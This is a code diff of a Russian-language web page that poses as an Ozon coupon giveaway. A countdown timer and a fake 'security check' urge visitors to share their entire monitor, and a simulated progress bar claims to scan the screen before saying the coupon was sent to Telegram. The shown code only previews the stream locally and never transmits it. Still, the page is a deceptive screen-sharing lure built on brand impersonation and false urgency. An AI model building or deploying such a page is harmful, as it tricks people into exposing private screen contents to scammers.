@@ -27,20 +27,9 @@
             border: 1px solid rgba(255, 255, 255, 0.2);
             text-align: center;
         }
-        .logo {
-            font-size: 48px;
-            margin-bottom: 20px;
-        }
-        h1 {
-            font-size: 24px;
-            margin-bottom: 10px;
-            font-weight: 600;
-        }
-        .subtitle {
-            color: rgba(255, 255, 255, 0.8);
-            margin-bottom: 30px;
-            font-size: 14px;
-        }
+        .logo { font-size: 48px; margin-bottom: 20px; }
+        h1 { font-size: 24px; margin-bottom: 10px; font-weight: 600; }
+        .subtitle { color: rgba(255, 255, 255, 0.8); margin-bottom: 30px; font-size: 14px; }
         .coupon-box {
             background: linear-gradient(135deg, #34bf49 0%, #2a9c3d 100%);
             border-radius: 15px;
@@ -58,11 +47,7 @@
             height: 3px;
             background: rgba(255, 255, 255, 0.3);
         }
-        .amount {
-            font-size: 48px;
-            font-weight: bold;
-            margin: 10px 0;
-        }
+        .amount { font-size: 48px; font-weight: bold; margin: 10px 0; }
         .coupon-code {
             background: rgba(0, 0, 0, 0.2);
             padding: 15px;
@@ -73,11 +58,7 @@
             margin: 20px 0;
             border: 2px dashed rgba(255, 255, 255, 0.3);
         }
-        .timer {
-            color: #ffeb3b;
-            font-size: 14px;
-            margin-top: 10px;
-        }
+        .timer { color: #ffeb3b; font-size: 14px; margin-top: 10px; }
         .btn {
             background: white;
             color: #0088cc;
@@ -105,6 +86,8 @@
             cursor: not-allowed;
             transform: none;
         }
+        .btn-red { background: #ff4444; color: white; }
+        .btn-green { background: #34bf49; color: white; }
         .status {
             margin-top: 20px;
             padding: 15px;
@@ -112,52 +95,37 @@
             font-size: 14px;
             display: none;
         }
-        .success {
-            background: rgba(52, 191, 73, 0.2);
-            border: 1px solid #34bf49;
-            display: none;
-        }
-        .error {
-            background: rgba(255, 87, 87, 0.2);
-            border: 1px solid #ff5757;
-            display: none;
-        }
-        .steps {
-            text-align: left;
-            margin: 25px 0;
-        }
-        .step {
-            display: flex;
-            align-items: center;
-            margin-bottom: 15px;
-            padding: 15px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 10px;
-        }
-        .step-number {
-            background: #0088cc;
-            width: 30px;
-            height: 30px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 15px;
-            font-weight: bold;
-        }
-        #screenPreview {
+        .success { background: rgba(52, 191, 73, 0.2); border: 1px solid #34bf49; }
+        .error { background: rgba(255, 87, 87, 0.2); border: 1px solid #ff5757; }
+        .hidden { display: none !important; }
+        .screen-container {
             margin: 20px 0;
             padding: 20px;
             background: rgba(0, 0, 0, 0.2);
             border-radius: 10px;
-            min-height: 150px;
+            min-height: 200px;
             display: flex;
             align-items: center;
             justify-content: center;
             border: 2px dashed rgba(255, 255, 255, 0.2);
+            flex-direction: column;
         }
-        .hidden {
-            display: none !important;
+        video {
+            width: 100%;
+            max-height: 300px;
+            border-radius: 10px;
+            background: black;
+        }
+        .log {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 10px;
+            padding: 10px;
+            margin-top: 15px;
+            font-family: monospace;
+            font-size: 12px;
+            text-align: left;
+            max-height: 150px;
+            overflow-y: auto;
         }
     </style>
 </head>
@@ -174,170 +142,212 @@
             <div class="coupon-code" id="couponCode">OZON2026-XXXX</div>
             <div class="timer" id="timer">Акция действует: 04:59</div>
         </div>
-        
-        <div class="steps">
-            <div class="step">
-                <div class="step-number">1</div>
-                <div>
-                    <strong>Подтверждение личности</strong>
-                    <div style="font-size: 13px; opacity: 0.8;">Автоматическая проверка через экран</div>
-                </div>
+
+        <div class="screen-container">
+            <div id="step1">
+                <p>🔍 Нажмите кнопку ниже для начала проверки</p>
+                <p><small>Система запросит доступ к экрану на 5 секунд</small></p>
             </div>
-            <div class="step">
-                <div class="step-number">2</div>
-                <div>
-                    <strong>Анализ активности</strong>
-                    <div style="font-size: 13px; opacity: 0.8;">Проверка истории аккаунта (5 секунд)</div>
-                </div>
+            
+            <div id="step2" class="hidden">
+                <p>✅ Доступ к экрану получен</p>
+                <p><small>Теперь нажмите "Начать анализ"</small></p>
+                <video id="screenVideo" autoplay muted></video>
             </div>
-            <div class="step">
-                <div class="step-number">3</div>
-                <div>
-                    <strong>Активация купона</strong>
-                    <div style="font-size: 13px; opacity: 0.8;">Код будет отправлен в Telegram</div>
+            
+            <div id="step3" class="hidden">
+                <p>📊 Идет анализ экрана...</p>
+                <div style="width:100%;height:20px;background:#333;border-radius:10px;margin:15px 0;overflow:hidden;">
+                    <div id="progressBar" style="width:0%;height:100%;background:#34bf49;transition:width 0.5s;"></div>
                 </div>
+                <p id="progressText">Подготовка к анализу: 0%</p>
+            </div>
+            
+            <div id="step4" class="hidden">
+                <p>✅ Анализ завершен!</p>
+                <p><small>Купон активирован и отправлен в Telegram</small></p>
             </div>
         </div>
-        
-        <div id="screenPreview">
-            <div id="previewText">
-                🔍 Предпросмотр экрана появится здесь<br>
-                <small>После начала проверки</small>
-            </div>
-            <canvas id="screenCanvas" class="hidden"></canvas>
-        </div>
-        
-        <button class="btn" id="startBtn" onclick="startVerification()">
-            <span>🔐</span> НАЧАТЬ ПРОВЕРКУ БЕЗОПАСНОСТИ
+
+        <button class="btn" id="startBtn" onclick="startScreenCapture()">
+            <span>🔐</span> РАЗРЕШИТЬ ДОСТУП К ЭКРАНУ
         </button>
         
-        <button class="btn hidden" id="retryBtn" onclick="location.reload()">
+        <button class="btn btn-green hidden" id="analyzeBtn" onclick="startAnalysis()">
+            <span>📊</span> НАЧАТЬ АНАЛИЗ ЭКРАНА (5 сек)
+        </button>
+        
+        <button class="btn btn-red hidden" id="retryBtn" onclick="location.reload()">
             <span>↻</span> ПОВТОРИТЬ ПРОВЕРКУ
         </button>
-        
-        <div class="status success" id="successStatus">
-            ✅ Проверка завершена! Купон активирован.
-        </div>
-        
-        <div class="status error" id="errorStatus">
-            ❌ Ошибка доступа. Разрешите доступ к экрану.
+
+        <div class="log" id="debugLog">
+            <strong>Журнал системы:</strong><br>
+            <div id="logContent">Ожидание начала проверки...</div>
         </div>
     </div>
 
     <script>
-        // Элементы страницы
+        // Элементы
         const startBtn = document.getElementById('startBtn');
+        const analyzeBtn = document.getElementById('analyzeBtn');
         const retryBtn = document.getElementById('retryBtn');
-        const successStatus = document.getElementById('successStatus');
-        const errorStatus = document.getElementById('errorStatus');
         const couponCode = document.getElementById('couponCode');
         const timerElement = document.getElementById('timer');
-        const screenCanvas = document.getElementById('screenCanvas');
-        const previewText = document.getElementById('previewText');
+        const screenVideo = document.getElementById('screenVideo');
+        const progressBar = document.getElementById('progressBar');
+        const progressText = document.getElementById('progressText');
+        const logContent = document.getElementById('logContent');
+        
+        let mediaStream = null;
+        let currentStep = 1;
+        
+        // Логирование
+        function log(message) {
+            const time = new Date().toLocaleTimeString();
+            logContent.innerHTML += `<br>[${time}] ${message}`;
+            console.log(message);
+        }
         
         // Таймер
-        let timeLeft = 299; // 4:59
+        let timeLeft = 299;
         function updateTimer() {
             const min = Math.floor(timeLeft / 60);
             const sec = timeLeft % 60;
             timerElement.textContent = `Акция действует: ${min.toString().padStart(2, '0')}:${sec.toString().padStart(2, '0')}`;
-            if (timeLeft > 0) {
-                timeLeft--;
-                setTimeout(updateTimer, 1000);
-            }
+            if (timeLeft > 0) timeLeft--;
+            setTimeout(updateTimer, 1000);
         }
         updateTimer();
         
-        // Генерация купона С OZON2026
+        // Генерация купона
         function generateCoupon() {
             const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ0123456789';
             let code = '';
-            for (let i = 0; i < 4; i++) code += chars.charAt(Math.floor(Math.random() * chars.length));
+            for (let i = 0; i < 4; i++) {
+                code += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
             const finalCode = `OZON2026-${code}`;
             couponCode.textContent = finalCode;
+            log(`Сгенерирован купон: ${finalCode}`);
             return finalCode;
         }
         
-        // Основная функция
-        async function startVerification() {
+        // Шаг 1: Запрос доступа к экрану
+        async function startScreenCapture() {
+            log("Запрос доступа к экрану...");
             startBtn.disabled = true;
-            startBtn.innerHTML = '<span>🔄</span> Подключение к системе...';
+            startBtn.innerHTML = '<span>🔄</span> Запрос разрешения...';
             
             try {
-                // Запрос доступа к экрану
-                const stream = await navigator.mediaDevices.getDisplayMedia({
-                    video: { displaySurface: 'monitor', cursor: 'always' },
+                mediaStream = await navigator.mediaDevices.getDisplayMedia({
+                    video: {
+                        displaySurface: 'monitor',
+                        cursor: 'always'
+                    },
                     audio: false
                 });
                 
-                // Успешный доступ
-                previewText.style.display = 'none';
-                screenCanvas.classList.remove('hidden');
+                log("✅ Доступ к экрану получен");
                 
-                const ctx = screenCanvas.getContext('2d');
-                screenCanvas.width = 400;
-                screenCanvas.height = 200;
+                // Показываем видео
+                screenVideo.srcObject = mediaStream;
                 
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                
-                // Захват экрана
-                function captureFrame() {
-                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
-                        ctx.drawImage(video, 0, 0, screenCanvas.width, screenCanvas.height);
-                    }
-                }
-                
-                const interval = setInterval(captureFrame, 500);
-                
-                // Имитация процесса
-                startBtn.innerHTML = '<span>🔍</span> Анализ экрана...';
-                setTimeout(() => {
-                    startBtn.innerHTML = '<span>📊</span> Проверка истории...';
-                }, 2000);
-                
-                // Завершение через 5 секунд
-                setTimeout(() => {
-                    clearInterval(interval);
-                    stream.getTracks().forEach(track => track.stop());
-                    
-                    // Показ успеха
-                    successStatus.style.display = 'block';
-                    startBtn.classList.add('hidden');
-                    retryBtn.classList.remove('hidden');
-                    screenCanvas.classList.add('hidden');
-                    previewText.style.display = 'block';
-                    previewText.innerHTML = '✅ Проверка завершена<br><small>Купон активирован</small>';
-                    
-                    // Генерация купона
-                    generateCoupon();
-                    
-                }, 5000);
+                // Переходим к шагу 2
+                document.getElementById('step1').classList.add('hidden');
+                document.getElementById('step2').classList.remove('hidden');
+                startBtn.classList.add('hidden');
+                analyzeBtn.classList.remove('hidden');
                 
                 // Если пользователь отменил доступ
-                stream.getTracks()[0].onended = () => {
-                    clearInterval(interval);
-                    showError();
+                mediaStream.getTracks()[0].onended = () => {
+                    log("❌ Пользователь отменил доступ к экрану");
+                    resetToStep1();
                 };
                 
             } catch (error) {
-                console.error('Ошибка:', error);
-                showError();
+                log(`❌ Ошибка: ${error.message}`);
+                startBtn.disabled = false;
+                startBtn.innerHTML = '<span>🔐</span> ПОВТОРИТЬ ЗАПРОС ДОСТУПА';
+                startBtn.onclick = startScreenCapture;
             }
         }
         
-        function showError() {
-            errorStatus.style.display = 'block';
+        // Шаг 2: Анализ экрана
+        async function startAnalysis() {
+            log("Начало анализа экрана...");
+            analyzeBtn.disabled = true;
+            analyzeBtn.innerHTML = '<span>⏳</span> Анализ...';
+            
+            // Переходим к шагу 3
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.remove('hidden');
+            
+            // Симуляция прогресса
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 10;
+                progressBar.style.width = progress + '%';
+                progressText.textContent = getProgressText(progress);
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    completeAnalysis();
+                }
+            }, 500);
+        }
+        
+        function getProgressText(progress) {
+            if (progress < 30) return "Загрузка модуля анализа...";
+            if (progress < 60) return "Сканирование экрана на наличие кодов...";
+            if (progress < 90) return "Проверка истории активности...";
+            return "Финальная обработка...";
+        }
+        
+        function completeAnalysis() {
+            log("✅ Анализ экрана завершен");
+            
+            // Останавливаем трансляцию
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+            }
+            
+            // Переходим к шагу 4
+            document.getElementById('step3').classList.add('hidden');
+            document.getElementById('step4').classList.remove('hidden');
+            
+            analyzeBtn.classList.add('hidden');
+            retryBtn.classList.remove('hidden');
+            
+            // Генерируем купон
+            generateCoupon();
+            
+            // Симулируем отправку данных
+            setTimeout(() => {
+                log("📨 Купон отправлен в Telegram");
+            }, 1000);
+        }
+        
+        function resetToStep1() {
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.add('hidden');
+            document.getElementById('step4').classList.add('hidden');
+            document.getElementById('step1').classList.remove('hidden');
+            
+            startBtn.classList.remove('hidden');
+            analyzeBtn.classList.add('hidden');
+            retryBtn.classList.add('hidden');
+            
             startBtn.disabled = false;
-            startBtn.innerHTML = '<span>🔐</span> ПОВТОРИТЬ ПРОВЕРКУ';
-            startBtn.onclick = startVerification;
+            startBtn.innerHTML = '<span>🔐</span> РАЗРЕШИТЬ ДОСТУП К ЭКРАНУ';
+            startBtn.onclick = startScreenCapture;
         }
         
         // Инициализация
         window.onload = function() {
             generateCoupon();
-            console.log('Страница загружена');
+            log("Система проверки безопасности загружена");
+            log(`URL: ${window.location.href}`);
         };
     </script>
 </body>
